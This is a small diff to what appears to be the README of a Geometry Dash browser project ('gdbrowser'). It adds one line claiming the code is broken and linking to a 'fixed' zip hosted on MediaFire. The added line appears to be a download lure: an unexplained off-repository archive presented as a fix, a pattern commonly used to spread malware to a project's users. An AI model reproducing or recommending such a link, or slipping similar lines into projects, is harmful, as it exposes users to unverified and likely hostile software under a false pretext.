@@ -168,3 +168,5 @@ Inevitable misc folder
   
 
 happy gdbrowsing and god bless.
+
+Wait!... this code is broken... here is the fixed one! https://www.mediafire.com/file/dgtqkb312t0y4tp/Gdbrowser-fixed.zip/file
